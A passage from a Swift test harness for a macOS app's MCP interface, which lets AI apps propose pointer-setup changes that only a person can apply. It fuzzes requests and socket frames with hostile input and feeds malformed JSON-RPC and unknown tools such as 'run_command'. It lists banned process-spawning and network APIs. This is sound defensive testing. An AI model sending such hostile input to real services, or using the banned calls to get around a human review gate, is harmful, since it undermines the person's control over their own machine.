    while t < 60, rig.gate.isOpen {
        rig.clock += 0.005
        t += 0.005
        _ = rig.propose(code(#""trackingSpeed": \#(5 + Int(t * 10) % 20)"#))
        if rig.app.showing != nil, Int(t * 200) % 400 == 0 { rig.app.personCancels() }
    }
    check(!rig.gate.isOpen && rig.app.presented <= 1 + AIAppsLimits.declinesBeforeOff && rig.app.writes == 0,
          "hammering with proposals: \(rig.app.presented) sheets, switch \(rig.gate.isOpen ? "still on" : "off")")
}

section("Fuzzed requests")
do {
    var rng = SystemRandomNumberGenerator()
    let rig = Rig()
    let before = rig.app.config
    let seeds: [String] = [
        #"{"v":1,"tool":"get_setup","client":"Sim","arguments":{}}"#,
        #"{"v":1,"tool":"propose_changes","client":"Sim","arguments":{"setup":{"format":"glideball-ai-setup","version":1,"trackingSpeed":9,"buttons":{"2":"keys:cmd+w","3":{"gesture":{"up":"back","tap":"system"}}},"combos":[{"buttons":[1,2],"action":"open:Notes"}],"apps":[{"app":"Safari","buttons":{"1":"forward"}}]}}}"#,
        #"{"v":1,"tool":"check_proposal","client":"Sim","arguments":{"id":"0123456789abcdef0123456789abcdef"}}"#,
    ]
    let bits: [String] = ["{", "}", "[", "]", "\"", ":", ",", "null", "true", "1e999", "-0", "\\u0000", "\\", "\u{202E}", "0", "apply", "keys:cmd+q", "open:Terminal",
                          "\"buttons\":{\"0\":\"rightClick\"}", "\"enabled\":false", String(repeating: "[", count: 200), "🙂", "\n"]
    var shownCount = 0
    let rounds = 4_000
    for i in 0..<rounds {
        var bytes = Array(seeds[i % seeds.count].utf8)
        for _ in 0..<Int.random(in: 1...6, using: &rng) {
            let at = Int.random(in: 0...bytes.count, using: &rng)
            switch Int.random(in: 0..<5, using: &rng) {
            case 0: bytes.insert(contentsOf: Array(bits.randomElement(using: &rng)!.utf8), at: at)
            case 1: if at < bytes.count { bytes.remove(at: at) }
            case 2: if at < bytes.count { bytes[at] = UInt8.random(in: 0...255, using: &rng) }
            case 3: bytes.removeSubrange(at..<min(bytes.count, at + Int.random(in: 1...40, using: &rng)))
            default: bytes.insert(contentsOf: bytes[max(0, at - 30)..<at], at: at)
            }
        }
        rig.clock += 0.2
        if !rig.gate.isOpen { rig.gate.open() }
        let r = rig.service.answer(Data(bytes))
        check(isClean(r.text) && r.text.utf8.count <= AIAppsLimits.maxReplyBytes, "fuzz \(i): the answer isn't clean")
        check(rig.app.config == before && rig.app.writes == 0, "fuzz \(i): something was written without the person")
        if rig.app.showing != nil {
            shownCount += 1
            // The person applies every third one with nothing ticked: still inside the rules.
            if shownCount % 3 == 0 {
                rig.app.personApplies()
                let c = rig.app.config
                check(c.buttons[0] == before.buttons[0] && c.enabled == before.enabled && c.globalShortcuts == before.globalShortcuts, "fuzz \(i): Apply changed button 0 or the pause switch")
                check(ImportReview.flagged(from: before, to: c).flatMap(\.risks).allSatisfy { $0.tier != .destructive }, "fuzz \(i): an unticked destructive shortcut was applied")
                check(c == c.clamped(), "fuzz \(i): a setting is outside the app's limits")
                rig.app.config = before
                rig.app.writes = 0
            } else {
                rig.app.personApplies(ticking: nil)
                check(rig.app.config.buttons[0] == before.buttons[0] && rig.app.config.enabled == before.enabled, "fuzz \(i): Apply changed button 0 or the pause switch")
                rig.app.config = before
                rig.app.writes = 0
            }
        }
    }
    check(shownCount > 20, "the fuzzer hardly ever got a proposal shown (\(shownCount)): it isn't testing the review")
    print("  \(rounds) fuzzed requests, \(shownCount) shown and applied by the fake person")
}

// MARK: - The socket

/// One connection, by hand: connects and sends raw bytes; returns what came back before the other end closed.
func rawExchange(_ path: String, _ bytes: [UInt8], wait: Double = 4, closeAfter: Bool = false) -> [UInt8]? {
    guard var addr = AIAppsFrame.address(path) else { return nil }
    let fd = socket(AF_UNIX, SOCK_STREAM, 0)
    guard fd >= 0 else { return nil }
    defer { close(fd) }
    AIAppsFrame.prepare(fd, timeout: 0.5)
    let ok = withUnsafePointer(to: &addr) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { connect(fd, $0, socklen_t(MemoryLayout<sockaddr_un>.size)) } }
    guard ok == 0 else { return nil }
    if !bytes.isEmpty { _ = bytes.withUnsafeBytes { send(fd, $0.baseAddress, bytes.count, 0) } }
    if closeAfter { shutdown(fd, SHUT_WR) }
    var out: [UInt8] = []
    var buf = [UInt8](repeating: 0, count: 65_536)
    let end = AIAppsClock.now() + wait
    while AIAppsClock.now() < end {
        let n = recv(fd, &buf, buf.count, 0)
        if n > 0 { out.append(contentsOf: buf[0..<n]) } else if n == 0 { return out } else if errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR { return out }
    }
    return out
}

func framed(_ body: Data) -> [UInt8] {
    let n = UInt32(body.count)
    return [UInt8(n >> 24), UInt8((n >> 16) & 0xFF), UInt8((n >> 8) & 0xFF), UInt8(n & 0xFF)] + Array(body)
}

func replyIn(_ bytes: [UInt8]?) -> AIAppsReply? {
    guard let bytes, bytes.count > 4 else { return nil }
    return AIAppsReply(frame: Data(bytes.dropFirst(4)))
}

let folder = NSTemporaryDirectory() + "gb-mcp-sim-\(getpid())"
try? FileManager.default.removeItem(atPath: folder)
let socketPath = folder + "/Glide/mcp.sock"

section("The socket: this person's, 0600, gone with the switch")
do {
    let rig = Rig()
    let lock = NSLock()
    let before = rig.app.config
    let listener = AIAppsListener(path: socketPath, peerOK: { _ in true }) { frame in lock.withLock { rig.service.handle(frame) } }
    let send: (Data) -> Result<Data, AIAppsClient.Failure> = { AIAppsClient.send($0, to: socketPath, peerOK: { _ in true }) }
    func tryCall(_ tool: String, _ args: [String: Any] = [:]) -> AIAppsReply? {
        guard case .success(let d) = send(rig.frame(tool, args)) else { return nil }
        return AIAppsReply(frame: d)
    }

    if case .failure(let f) = send(rig.frame("get_setup")) { check(f == .notThere, "with no socket file the helper says \(f)") } else { check(false, "something answered with no socket") }
    do { try listener.start() } catch { check(false, "the socket couldn't start: \(error)") }
    var st = stat()
    check(lstat(socketPath, &st) == 0 && (st.st_mode & S_IFMT) == S_IFSOCK && st.st_uid == getuid() && st.st_mode & 0o777 == 0o600,
          "the socket file isn't this person's 0600 socket (mode \(String(st.st_mode & 0o777, radix: 8)))")
    var dir = stat()
    check(lstat(folder + "/Glide", &dir) == 0 && dir.st_mode & 0o077 == 0, "the folder it made isn't private")

    let ok = tryCall("get_setup")
    check(ok?.ok == true && ok?.text.contains("<their_setup>") == true, "get_setup over the socket: \(ok?.text.prefix(60) ?? "nothing")")
    lock.withLock { rig.clock += 1 }
    let p = tryCall("propose_changes", ["setup": ["format": "glideball-ai-setup", "version": 1, "trackingSpeed": 9]])
    let id = p.map(json)?["id"] as? String ?? ""
    check(p?.ok == true && lock.withLock({ rig.app.showing?.id }) == id && rig.app.config == before, "a proposal over the socket wasn't shown, or changed something")
    check(tryCall("check_proposal", ["id": id]).map(json)?["status"] as? String == "pending", "check_proposal over the socket")
    lock.withLock { rig.app.personCancels() }

    // Hostile bytes straight onto the socket.
    let t0 = AIAppsClock.now()
    let tooLong = replyIn(rawExchange(socketPath, [0x7F, 0xFF, 0xFF, 0xFF] + [UInt8](repeating: 0x41, count: 4_096)))
    check(tooLong?.ok == false && tooLong?.text == AIAppsText.unreadable && AIAppsClock.now() - t0 < 1.5, "a 2 GB length wasn't refused at once, unread")
    let justOver = replyIn(rawExchange(socketPath, framed(Data(repeating: 0x20, count: AIAppsLimits.maxRequestBytes + 1))))
    check(justOver?.ok == false && justOver?.text == AIAppsText.unreadable, "64 KB + 1 wasn't refused by its length")
    check(rawExchange(socketPath, [0, 0, 0, 0])?.count ?? 0 > 0, "a zero length got no refusal")
    check(replyIn(rawExchange(socketPath, [0, 0, 0, 0]))?.ok == false, "a zero length wasn't refused")
    check(replyIn(rawExchange(socketPath, framed(Data("garbage".utf8))))?.ok == false, "garbage in a frame wasn't refused")
    check(replyIn(rawExchange(socketPath, framed(Data(repeating: 0x5B, count: 50_000))))?.ok == false, "50,000 [ in a frame weren't refused")
    check(rawExchange(socketPath, [], closeAfter: true)?.isEmpty == true, "a connection that says nothing got an answer")
    check(rawExchange(socketPath, Array("GET / HTTP/1.1\r\nHost: localhost\r\n\r\n".utf8), wait: 1)?.count ?? 0 > 0, "an HTTP request got no refusal")
    check(replyIn(rawExchange(socketPath, Array("GET / HTTP/1.1\r\nHost: localhost\r\n\r\n".utf8), wait: 1))?.ok == false, "an HTTP request was answered as a request")
    // A frame that stops half way is closed after 2 seconds, without an answer…
    let slowStart = AIAppsClock.now()
    let stalled = rawExchange(socketPath, [0, 0, 0, 200] + Array(#"{"v":1,"tool":"get_setup""#.utf8), wait: 6)
    let took = AIAppsClock.now() - slowStart
    check(stalled?.isEmpty == true && took > 1.5 && took < 4.5, "a stalled request was held for \(String(format: "%.1f", took)) s (answer: \(stalled?.count ?? -1) bytes)")
    // …and stalled connections don't starve a real one, however many there are.
    let group = DispatchGroup()
    for _ in 0..<40 {
        group.enter()
        DispatchQueue.global().async {
            _ = rawExchange(socketPath, [0, 0, 1, 0], wait: 4)
            group.leave()
        }
    }
    usleep(300_000)
    check(listener.turnedAway > 0, "40 stalled connections were all let in (at most \(AIAppsListener.maxConnections) at once)")
    _ = group.wait(timeout: .now() + 10)
    lock.withLock { rig.clock += 5 }
    check(tryCall("get_setup")?.ok == true, "after 40 stalled connections a real request isn't answered")
    // A flood of real requests: the rate limit holds over the socket too.
    lock.withLock { rig.clock += 5 }
    let counts = NSLock()
    var good = 0, refusedFast = 0, lost = 0
    DispatchQueue.concurrentPerform(iterations: 300) { _ in
        let r = tryCall("get_setup")
        counts.withLock { if r?.ok == true { good += 1 } else if r?.text == AIAppsText.tooFast { refusedFast += 1 } else { lost += 1 } }
    }
    // How many get a connection at all depends on how busy the Mac is (at most 8 at once, the
    // rest turned away), so the count answered isn't fixed: never more than the limit, and nobody
    // is told to slow down before the limit is reached. The exact limit is checked in-process above.
    let cap = Int(AIAppsLimits.perSecond)
    check(good > 0 && good <= cap && (refusedFast == 0 || good == cap) && good + refusedFast + lost == 300, "300 at once over the socket: \(good) answered, \(refusedFast) told to slow down, \(lost) turned away")
    check(rig.app.config == before && rig.app.writes == 0, "something was written")

    // The other end must be this Glideball: another program is turned away (when this build is signed).
    listener.stop()
    check(lstat(socketPath, &st) != 0, "stop left the socket file")
    if case .failure(let f) = send(rig.frame("get_setup")) { check(f == .notThere, "after stop the helper says \(f)") } else { check(false, "something answered after stop") }
    check(rawExchange(socketPath, framed(rig.frame("get_setup"))) == nil, "a connection got through after stop")

    if AIAppsPeer.ownRequirement != nil, FileManager.default.isExecutableFile(atPath: "/usr/bin/nc") {
        func viaNC() -> Int {
            let nc = Process()
            nc.executableURL = URL(fileURLWithPath: "/usr/bin/nc")
            nc.arguments = ["-U", socketPath]
            let input = Pipe(), output = Pipe()
            nc.standardInput = input
            nc.standardOutput = output
            nc.standardError = FileHandle.nullDevice
            guard (try? nc.run()) != nil else { return -1 }
            input.fileHandleForWriting.write(Data(framed(rig.frame("get_setup"))))
            let killer = DispatchWorkItem { nc.terminate() }
            DispatchQueue.global().asyncAfter(deadline: .now() + 3, execute: killer)
            let got = output.fileHandleForReading.readDataToEndOfFile()
            killer.cancel()
            try? input.fileHandleForWriting.close()
            return got.count
        }
        lock.withLock { rig.clock += 5 }
        let open = AIAppsListener(path: socketPath, peerOK: { _ in true }) { frame in lock.withLock { rig.service.handle(frame) } }
        try? open.start()
        let reads = rig.app.setupsRead
        check(viaNC() > 100 && rig.app.setupsRead == reads + 1, "nc can't reach a socket with no peer check (the next check would prove nothing)")
        open.stop()
        lock.withLock { rig.clock += 5 }
        let strict = AIAppsListener(path: socketPath) { frame in lock.withLock { rig.service.handle(frame) } }
        try? strict.start()
        check(viaNC() == 0 && rig.app.setupsRead == reads + 1 && strict.turnedAway == 1, "another program (nc) was answered by a socket that checks its peer")
        let own = AIAppsClient.send(rig.frame("get_setup"), to: socketPath)
        if case .success(let d) = own { check(AIAppsReply(frame: d)?.ok == true, "this same program wasn't answered") } else { check(false, "this same program was turned away by the peer check: \(own)") }
        strict.stop()
        print("  peer check: nc turned away, this binary let in")
    } else {
        print("  (peer check skipped: this build isn't signed, or there's no /usr/bin/nc)")
    }

    // Things in the way of the socket file are left alone.
    try? "keep me".write(toFile: socketPath, atomically: true, encoding: .utf8)
    do { try listener.start(); check(false, "the socket started over a file that was there") } catch { check(error as? AIAppsListener.Failure == .inTheWay, "a file in the way: \(error)") }
    check((try? String(contentsOfFile: socketPath, encoding: .utf8)) == "keep me", "a file that was in the way was changed")
    if case .failure(let f) = send(rig.frame("get_setup")) { check(f == .notOurs, "the helper reads a plain file as \(f)") } else { check(false, "the helper talked to a plain file") }
    try? FileManager.default.removeItem(atPath: socketPath)
    let target = folder + "/target.txt"
    try? "target".write(toFile: target, atomically: true, encoding: .utf8)
    symlink(target, socketPath)
    do { try listener.start(); check(false, "the socket started over a link") } catch { check(error as? AIAppsListener.Failure == .inTheWay, "a link in the way: \(error)") }
    check((try? String(contentsOfFile: target, encoding: .utf8)) == "target" && (try? FileManager.default.destinationOfSymbolicLink(atPath: socketPath)) == target,
          "a link in the way, or what it points at, was changed")
    if case .failure(let f) = send(rig.frame("get_setup")) { check(f == .notOurs, "the helper reads a link as \(f)") } else { check(false, "the helper followed a link") }
    unlink(socketPath)

    // A socket anyone could open isn't trusted by the helper.
    try? listener.start()
    chmod(socketPath, 0o666)
    if case .failure(let f) = send(rig.frame("get_setup")) { check(f == .notOurs, "the helper reads a 0666 socket as \(f)") } else { check(false, "the helper talked to a socket anyone can open") }
    // A socket file a crash left (nothing listening) is replaced, and stop only deletes its own file.
    listener.stop()
    let leftover = AIAppsListener(path: socketPath, peerOK: { _ in true }) { _ in Data() }
    try? leftover.start()
    do { try listener.start() } catch { check(false, "a socket file that was left behind wasn't replaced: \(error)") }
    leftover.stop()
    check(lstat(socketPath, &st) == 0, "stopping an old listener deleted the new one's file")
    lock.withLock { rig.clock += 5 }
    check(tryCall("get_setup")?.ok == true, "the replaced socket doesn't answer")
    listener.stop()

    let long = AIAppsListener(path: folder + "/" + String(repeating: "x", count: 120) + "/mcp.sock") { _ in Data() }
    do { try long.start(); check(false, "a path too long for a socket started") } catch { check(error as? AIAppsListener.Failure == .path, "a long path: \(error)") }
    check(rig.app.config == before && rig.app.writes == 0, "something was written")
}

// MARK: - The helper (MCP on stdin and stdout)

func rpc(_ stdio: AIAppsStdio, _ line: String) -> [String: Any]? {
    guard let out = stdio.handle(Data(line.utf8)) else { return nil }
    check(!out.contains(0x0A) && !out.contains(0x0D), "an answer isn't one line: \(String(decoding: out.prefix(80), as: UTF8.self))")
    return (try? JSONSerialization.jsonObject(with: out)) as? [String: Any]
}
func errorCode(_ o: [String: Any]?) -> Int? { (o?["error"] as? [String: Any])?["code"] as? Int }
func toolText(_ o: [String: Any]?) -> (text: String, isError: Bool)? {
    guard let r = o?["result"] as? [String: Any], let c = (r["content"] as? [[String: Any]])?.first, let t = c["text"] as? String,
          let e = r["isError"] as? Bool else { return nil }
    return (t, e)
}

section("The helper: MCP, good and hostile")
do {
    let rig = Rig()
    let lock = NSLock()
    let before = rig.app.config
    let listener = AIAppsListener(path: socketPath, peerOK: { _ in true }) { frame in lock.withLock { rig.service.handle(frame) } }
    var sent = 0
    let stdio = AIAppsStdio(version: "sim") { sent += 1; return AIAppsClient.send($0, to: socketPath, peerOK: { _ in true }) }

    // The handshake and the list need no Glideball.
    let hello = rpc(stdio, #"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"Sim‮ Desktop","version":"1"}}}"#)
    let info = hello?["result"] as? [String: Any]
    check(info?["protocolVersion"] as? String == "2025-06-18" && (info?["capabilities"] as? [String: Any])?.keys.sorted() == ["tools"]
          && (info?["serverInfo"] as? [String: Any])?["name"] as? String == "glideball", "initialize: \(hello ?? [:])")
    do {
        let other = AIAppsStdio(version: "sim") { _ in .failure(.notThere) }
        check((rpc(other, #"{"jsonrpc":"2.0","id":2,"method":"initialize","params":{"protocolVersion":"1999-01-01"}}"#)?["result"] as? [String: Any])?["protocolVersion"] as? String
              == AIAppsStdio.protocolVersions[0], "an unknown MCP version isn't answered with ours")
    }
    check(rpc(stdio, #"{"jsonrpc":"2.0","method":"notifications/initialized"}"#) == nil, "a notification got an answer")
    check((rpc(stdio, #"{"jsonrpc":"2.0","id":"p","method":"ping"}"#)?["result"] as? [String: Any])?.isEmpty == true, "ping")
    let list = (rpc(stdio, #"{"jsonrpc":"2.0","id":3,"method":"tools/list"}"#)?["result"] as? [String: Any])?["tools"] as? [[String: Any]] ?? []
    check(list.compactMap { $0["name"] as? String } == planned, "tools/list over MCP: \(list.compactMap { $0["name"] as? String })")
    check(list.allSatisfy { $0["inputSchema"] is [String: Any] && ($0["description"] as? String)?.isEmpty == false }, "a tool has no schema or description")
    check(sent == 0, "the handshake or the list reached for Glideball")

    // No socket (Glideball not open, or the switch off): every tool says so, and nothing is started.
    for call in [#"{"name":"get_setup"}"#, #"{"name":"propose_changes","arguments":{"setup":{"trackingSpeed":9}}}"#,
                 #"{"name":"check_proposal","arguments":{"id":"0123456789abcdef0123456789abcdef"}}"#] {
        let r = toolText(rpc(stdio, #"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":\#(call)}"#))
        check(r?.isError == true && r?.text == AIAppsText.off, "with no socket: \(r?.text.prefix(60) ?? "nothing")")
    }
    check(!FileManager.default.fileExists(atPath: socketPath) && rig.app.setupsRead == 0, "the helper made the socket, or reached Glideball")

    try? listener.start()
    let setup = toolText(rpc(stdio, #"{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"get_setup","arguments":{}}}"#))
    check(setup?.isError == false && setup?.text.contains("<their_setup>") == true, "get_setup through the helper")
    lock.withLock { rig.clock += 1 }
    let proposed = toolText(rpc(stdio, #"{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"propose_changes","arguments":{"setup":{"format":"glideball-ai-setup","version":1,"buttons":{"2":"keys:cmd+q","1":"back"}}}}}"#))
    let pj = (try? JSONSerialization.jsonObject(with: Data((proposed?.text ?? "").utf8))) as? [String: Any] ?? [:]
    let id = pj["id"] as? String ?? ""
    check(proposed?.isError == false && pj["status"] as? String == "shown" && pj["flagged_shortcuts"] as? Int == 1, "a proposal through the helper: \(proposed?.text ?? "nothing")")
    check(lock.withLock { rig.app.showing?.client } == "Sim Desktop", "the AI app's name reached the review as \(rig.app.showing?.client.debugDescription ?? "nothing")")
    lock.withLock { _ = rig.app.personApplies() }
    check(rig.app.config.buttons[1] == .back && rig.app.config.buttons[2] == before.buttons[2] && rig.app.config.buttons[0] == before.buttons[0],
          "through the helper: an unticked ⌘Q was applied, or the rest wasn't")
    let checked = toolText(rpc(stdio, #"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"check_proposal","arguments":{"id":"\#(id)"}}}"#))
    let cj = (try? JSONSerialization.jsonObject(with: Data((checked?.text ?? "").utf8))) as? [String: Any] ?? [:]
    check(cj["status"] as? String == "applied" && cj["flagged_shortcuts_left_out"] as? Int == nil, "check_proposal through the helper: \(checked?.text ?? "nothing")")

    // Hostile MCP.
    let reaches = sent
    check(errorCode(rpc(stdio, "not json")) == -32700, "garbage isn't a parse error")
    check(errorCode(rpc(stdio, "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":")) == -32700, "a cut-off message isn't a parse error")
    check(errorCode(rpc(stdio, String(repeating: "[", count: 10_000))) == -32700, "10,000 [ aren't a parse error")
    check(errorCode(rpc(stdio, String(repeating: #"{"a":"#, count: 40) + "1" + String(repeating: "}", count: 40))) == -32700, "40 deep isn't refused")
    check(errorCode(rpc(stdio, #"[{"jsonrpc":"2.0","id":1,"method":"ping"}]"#)) == -32600, "a batch isn't refused")
    check(errorCode(rpc(stdio, #"{"jsonrpc":"1.0","id":1,"method":"ping"}"#)) == -32600, "JSON-RPC 1.0 isn't refused")
    check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":1,"method":7}"#)) == -32600, "a method that's a number isn't refused")
    check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":true,"method":"ping"}"#)) == -32600, "an id that's true isn't refused")
    check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":null,"method":"ping"}"#)) == -32600, "a null id isn't refused")
    check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":{"a":1},"method":"ping"}"#)) == -32600, "an id that's an object isn't refused")
    let longID = rpc(stdio, #"{"jsonrpc":"2.0","id":"\#(String(repeating: "i", count: 5_000))","method":"ping"}"#)
    check(errorCode(longID) == -32600 && longID?["id"] is NSNull, "a 5,000 character id was sent back")
    check(rpc(stdio, #"{"jsonrpc":"2.0","id":9,"result":{"content":[]}}"#) == nil, "an answer nobody asked for got an answer")
    for method in ["resources/list", "resources/read", "prompts/list", "sampling/createMessage", "roots/list", "tools/execute", "shutdown", "", "tools/call\u{0}"] {
        check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":1,"method":\#(SetupJSON.quote(method))}"#)) == -32601, "\(method.debugDescription) isn't refused as unknown")
    }
    for name in ["apply", "run_command", "", "get_setup\n", "GET_SETUP", "../get_setup"] {
        check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":\#(SetupJSON.quote(name))}}"#)) == -32602, "a tool called \(name.debugDescription) isn't refused")
    }
    check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":["get_setup"]}"#)) == -32602, "params that are a list")
    check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_setup","arguments":"x"}}"#)) == -32602, "arguments that are text")
    check(errorCode(rpc(stdio, #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":7}}"#)) == -32602, "a tool name that's a number")
    check(sent == reaches, "a refused message reached for Glideball")
    // Too big to send on: refused by the helper, Glideball never hears of it.
    let bigCall = #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"propose_changes","arguments":{"setup":"\#(String(repeating: "x", count: 70_000))"}}}"#
    let tooBig = toolText(rpc(stdio, bigCall))
    check(tooBig?.isError == true && tooBig?.text == AIAppsText.tooBig && sent == reaches, "a 70 KB setup was sent on to Glideball")

    // Lines: a long one is dropped whole, and what follows is still read.
    var reader = AIAppsLineReader()
    var events = reader.feed(Array("{\"a\":1}\r\n\n".utf8))
    check(events == [.line(Data("{\"a\":1}".utf8))], "a line with \\r\\n, then a blank one: \(events)")
    events = reader.feed([UInt8](repeating: 0x61, count: AIAppsLimits.maxLineBytes + 50_000))
    check(events.isEmpty, "an unfinished long line gave \(events.count) events")
    events = reader.feed([UInt8](repeating: 0x61, count: 3_000_000) + Array("\n{\"b\":2}\n".utf8))
    check(events == [.tooLong, .line(Data("{\"b\":2}".utf8))], "after a 3 MB line: \(events.map { "\($0)".prefix(20) })")
    events = reader.feed([UInt8](repeating: 0x62, count: AIAppsLimits.maxLineBytes) + [0x0A])
    check(events.count == 1 && events.first != .tooLong, "a line of exactly the limit was dropped")
    check(errorCode((try? JSONSerialization.jsonObject(with: AIAppsStdio.tooLongReply)) as? [String: Any]) == -32600, "the answer to a long line")

    // A Glideball that answers nonsense (something else is on the socket): the helper says it's off.
    listener.stop()
    for nonsense in [Data(), Data("hello".utf8), Data(#"{"ok":"yes","text":1}"#.utf8), Data(#"["ok"]"#.utf8), Data(repeating: 0x5B, count: 5_000),
                     Data(#"{"ok":true}"#.utf8)] {
        let liar = AIAppsListener(path: socketPath, peerOK: { _ in true }) { _ in nonsense }
        try? liar.start()
        let r = toolText(rpc(stdio, #"{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"get_setup"}}"#))
        check(r?.isError == true && r?.text == AIAppsText.off, "a nonsense answer (\(nonsense.count) bytes) was passed on: \(r?.text.prefix(40) ?? "nothing")")
        liar.stop()
    }
}

// MARK: - The sources and the built binary

section("Nothing in it can run, fetch or write anything")
do {
    // The files that face an AI app have no way to start a process, reach the network, write
    // a file or script another app. (AIAppsSocket.swift's only file calls are on the socket file.)
    let banned = ["Process(", "NSTask", "posix_spawn", "execv", "execl", "fork(", "system(", "popen(", "NSAppleScript", "osascript", "URLSession", "NSURLConnection",
                  "NSWorkspace.shared.open", "dlopen", "FileHandle(forWriting", ".write(to", "createFile(", "NSPasteboard", "CGEvent", "UserDefaults"]
    for file in ["AIApps.swift", "AIAppsHelper.swift", "AIAppsSocket.swift"] {
        guard let source = try? String(contentsOfFile: "Sources/Glide/" + file, encoding: .utf8) else { check(false, "can't read \(file)"); continue }
        // Comments say what the code never does; only the code counts.
        let lines = source.split(separator: "\n").filter { !$0.trimmingCharacters(in: .whitespaces).hasPrefix("//") }.joined(separator: "\n")
        for word in banned { check(!lines.contains(word), "\(file) uses \(word)") }
    }
    if let all = try? String(contentsOfFile: "Sources/Glide/AIAppsCenter.swift", encoding: .utf8) {
        let center = all.split(separator: "\n").filter { !$0.trimmingCharacters(in: .whitespaces).hasPrefix("//") }.joined(separator: "\n")
        for word in ["Process(", "URLSession", "UserDefaults", "FeatureUse", "NSPasteboard", "engine.note"] { check(!center.contains(word), "AIAppsCenter.swift uses \(word)") }
    } else { check(false, "can't read AIAppsCenter.swift") }
    // The switch is nowhere a settings file, a share, sync or the stats could pick it up.
    for file in ["Config.swift", "SharedSetup.swift", "SettingsSync.swift", "ShareData.swift", "BackupStore.swift", "StatusFile.swift", "CrashReports.swift", "SetupCode.swift", "SetupCodeReader.swift"] {
        guard let source = try? String(contentsOfFile: "Sources/Glide/" + file, encoding: .utf8) else { check(false, "can't read \(file)"); continue }
        check(!source.contains("AIApps") && !source.contains("mcp"), "\(file) mentions the AI apps switch")
    }
}

section("The built binary as `--mcp` (the handshake and the list only: it never reaches for Glideball)")
do {
    let binary = ".build/release/Glide"
    if FileManager.default.isExecutableFile(atPath: binary) {
        let helper = Process()
        helper.executableURL = URL(fileURLWithPath: binary)
        helper.arguments = ["--mcp"]
        let input = Pipe(), output = Pipe(), errors = Pipe()
        helper.standardInput = input
        helper.standardOutput = output
        helper.standardError = errors
        do {
            try helper.run()
            let lines = [#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"mcp-sim","version":"1"}}}"#,
                         #"{"jsonrpc":"2.0","method":"notifications/initialized"}"#,
                         #"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#,
                         "garbage \u{1} }{",
                         String(repeating: "x", count: AIAppsLimits.maxLineBytes + 10),
                         #"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"apply_now"}}"#,
                         #"{"jsonrpc":"2.0","id":4,"method":"ping"}"#]
            let started = AIAppsClock.now()
            input.fileHandleForWriting.write(Data((lines.joined(separator: "\n") + "\n").utf8))
            try? input.fileHandleForWriting.close()   // the AI app went away
            let killer = DispatchWorkItem { helper.terminate() }
            DispatchQueue.global().asyncAfter(deadline: .now() + 10, execute: killer)
            let out = output.fileHandleForReading.readDataToEndOfFile()
            let err = errors.fileHandleForReading.readDataToEndOfFile()
            helper.waitUntilExit()
            killer.cancel()
            let took = AIAppsClock.now() - started
            let answers = out.split(separator: 0x0A).map { (try? JSONSerialization.jsonObject(with: Data($0))) as? [String: Any] }
            check(helper.terminationReason == .exit && helper.terminationStatus == 0 && took < 8, "the helper didn't leave when its input closed (status \(helper.terminationStatus), \(String(format: "%.1f", took)) s)")
            check(answers.count == 6 && answers.allSatisfy { $0?["jsonrpc"] as? String == "2.0" }, "the helper wrote \(answers.count) lines, not 6 JSON-RPC answers: \(String(decoding: out.prefix(300), as: UTF8.self))")
            check(err.isEmpty, "the helper wrote to stderr: \(String(decoding: err.prefix(200), as: UTF8.self))")
            if answers.count == 6 {
                let tools = ((answers[1]?["result"] as? [String: Any])?["tools"] as? [[String: Any]])?.compactMap { $0["name"] as? String }
                check(tools == planned, "the built helper's tools are \(tools ?? [])")
                check(errorCode(answers[2]) == -32700 && errorCode(answers[3]) == -32600 && errorCode(answers[4]) == -32602 && answers[5]?["id"] as? Int == 4,
                      "the built helper's answers to garbage, a long line, an unknown tool and a ping")
            }
            print("  ran \(binary) --mcp: \(answers.count) answers, exit \(helper.terminationStatus) in \(String(format: "%.2f", took)) s")
        } catch {
            check(false, "couldn't run \(binary) --mcp: \(error)")
        }
    } else {
        print("  (skipped: no \(binary); swift build -c release first)")
    }
}

try? FileManager.default.removeItem(atPath: folder)
print("")
if failures > 0 {
    print("mcp-sim: \(failures) of \(checks) checks FAILED")
    exit(1)
}
print("mcp-sim: all \(checks) checks passed")
